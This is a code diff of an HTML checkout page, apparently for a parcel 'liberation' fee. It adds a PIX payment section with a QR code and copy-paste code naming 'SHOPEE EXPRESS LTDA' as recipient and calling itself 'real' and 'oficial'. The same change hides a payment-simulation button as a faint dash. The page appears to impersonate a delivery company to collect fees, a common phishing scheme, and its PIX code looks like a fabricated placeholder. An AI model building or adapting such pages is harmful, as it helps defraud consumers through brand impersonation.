@@ -169,12 +169,12 @@
             }
         }
     </style>
-  <script type="module" crossorigin src="/assets/tracking-C2-GxfPN.js"></script>
+  <script type="module" crossorigin src="/assets/tracking-fRNqtWY5.js"></script>
   <link rel="modulepreload" crossorigin href="/assets/modulepreload-polyfill-B5Qt9EMX.js">
   <link rel="modulepreload" crossorigin href="/assets/database-CTJo1PQf.js">
   <link rel="modulepreload" crossorigin href="/assets/cpf-validator-B4PsRAE6.js">
   <link rel="modulepreload" crossorigin href="/assets/navigation-BwbyOJod.js">
-  <link rel="stylesheet" crossorigin href="/assets/style-DuobgqBV.css">
+  <link rel="stylesheet" crossorigin href="/assets/style-BE7ta-iG.css">
 </head>
 <body>
     <!-- Order Confirmation Popup -->
@@ -341,10 +341,77 @@
                     </div>
                 </div>
                 
-                <div style="text-align: center; margin-top: 20px;">
-                    <button id="simulatePaymentButton" class="liberation-button-timeline">
-                        <i class="fas fa-credit-card"></i> Simular Pagamento
-                    </button>
+                <!-- Seção PIX Real - Zentra Pay Oficial -->
+                <div class="professional-pix-section">
+                    <h3 class="pix-section-title">Pagamento via Pix</h3>
+                    
+                    <div class="pix-content-grid">
+                        <!-- QR Code Real do Zentra Pay -->
+                        <div class="qr-code-section">
+                            <div class="qr-code-container">
+                                <img id="realPixQrCode" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2" alt="QR Code PIX Real - Zentra Pay Oficial" class="professional-qr-code">
+                            </div>
+                        </div>
+                        
+                        <!-- PIX Copia e Cola Real do Zentra Pay -->
+                        <div class="pix-copy-section">
+                            <label class="pix-copy-label">PIX Copia e Cola</label>
+                            <div class="professional-copy-container">
+                                <textarea id="pixCodeModal" class="professional-pix-input" readonly>00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2</textarea>
+                                <button class="professional-copy-button" id="copyPixButtonModal">
+                                    <i class="fas fa-copy"></i> Copiar Chave PIX
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Instruções de Pagamento -->
+                    <div class="professional-payment-steps">
+                        <h4 class="steps-title">Como realizar o pagamento:</h4>
+                        <div class="payment-steps-grid">
+                            <div class="payment-step">
+                                <div class="step-number">1</div>
+                                <div class="step-content">
+                                    <i class="fas fa-mobile-alt step-icon"></i>
+                                    <span class="step-text">Acesse seu app do banco</span>
+                                </div>
+                            </div>
+                            <div class="payment-step">
+                                <div class="step-number">2</div>
+                                <div class="step-content">
+                                    <i class="fas fa-qrcode step-icon"></i>
+                                    <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
+                                </div>
+                            </div>
+                            <div class="payment-step">
+                                <div class="step-number">3</div>
+                                <div class="step-content">
+                                    <i class="fas fa-check step-icon"></i>
+                                    <span class="step-text">Confirme o pagamento</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Botão de Simulação para Testes -->
+                    <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
+                        <button id="simulatePaymentButton" style="
+                            background: transparent;
+                            color: #666;
+                            border: 1px solid #ddd;
+                            padding: 6px 12px;
+                            border-radius: 6px;
+                            cursor: pointer;
+                            font-weight: 600;
+                            transition: all 0.3s ease;
+                            opacity: 0.7;
+                            font-size: 12px;
+                            min-width: 30px;
+                            height: 28px;
+                        ">
+                            -
+                        </button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -535,7 +602,7 @@
                     if (!this.hasAttribute('data-retry')) {
                         this.setAttribute('data-retry', 'true');
                         alert('Ocorreu um erro ao tentar processar o pagamento');
-                        this.innerHTML = '<i class="fas fa-redo"></i> Tentar Novamente';
+                        this.textContent = '--';
                         return;
                     }
                     
